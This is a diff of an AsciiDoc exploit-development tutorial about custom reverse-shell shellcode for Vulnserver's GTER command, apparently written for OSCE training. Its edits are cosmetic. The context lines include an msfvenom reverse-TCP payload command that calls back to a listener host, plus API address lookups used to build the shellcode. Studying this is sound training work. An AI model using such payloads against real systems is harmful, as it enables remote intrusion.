@@ -5,7 +5,7 @@
 :tags: osce, vulnserver, training, exploit
 :image: cover.png
 :alt: Photo by Florian Klauer on Unsplash
-:description: In the previous post, we successfully exploited the GTER command of Vulnserver using a technique called 'Egghunting.' It was needed to use that approach because we had a reduced space to work. In this post, we will see an alternative way of exploiting this command.
+:description: In this post, we will use an alternative way of exploiting Vulnserver GTER command.
 :keywords: Bussiness, Information, Security, Protection, Hacking, Exploit, OSCE
 :author: Andres Roldan
 :writer: aroldan
@@ -56,7 +56,7 @@ from our shellcode that can save us a great amount of bytes. Every byte counts.
 As a reference, let's create a reverse shellcode using `msfvenom`:
 
 .msfvenom
-[source,bash]
+[source,console]
 ----
 $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.20 LPORT=4444 EXITFUNC=thread -f raw -o /dev/null -b '\x00'
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -124,7 +124,7 @@ For retrieving the addresses of functions on the current `OS`,
 you can use the link:http://www.vividmachines.com/shellcode/arwin.c[arwin] tool:
 
 .arwin finding WSASocketA()
-[source,bash]
+[source,console]
 ----
 C:\Documents and Settings\Administrator>arwin ws2_32 WSASocketA
 arwin - win32 address resolution program - by steve hanna - v.01
@@ -185,7 +185,7 @@ struct sockaddr {
 Get the address of `connect()`:
 
 .arwin finding connect()
-[source,bash]
+[source,console]
 ----
 C:\Documents and Settings\Administrator>arwin ws2_32 connect
 arwin - win32 address resolution program - by steve hanna - v.01
@@ -311,7 +311,7 @@ typedef struct _PROCESS_INFORMATION {
 Get the address of `CreateProcessA()`:
 
 .arwin finding CreateProcessA()
-[source,bash]
+[source,console]
 ----
 C:\Documents and Settings\Administrator>arwin kernel32 CreateProcessA
 arwin - win32 address resolution program - by steve hanna - v.01
@@ -486,7 +486,7 @@ call ebx
 We can compile this using `nasm`:
 
 .nasm compilation
-[source,bash]
+[source,console]
 ----
 $ nasm -f elf32 -o shellcode.o shellcode.asm
 ----
@@ -598,8 +598,8 @@ and it's done easily with two instructions:
 .Align stack
 [source,x86asm]
 ----
-PUSH EAX
-POP ESP
+push eax
+pop esp
 ----
 
 The first instruction will push the current value of `EAX` to the stack,
@@ -610,7 +610,7 @@ We can use `nasm_shell.rb` from Metasploit
 to get the opcodes of those instructions:
 
 .nasm_shell
-[source,bash]
+[source,console]
 ----
 $ cd /opt/metasploit-framework/embedded/framework/tools/exploit
 $ ./nasm_shell.rb
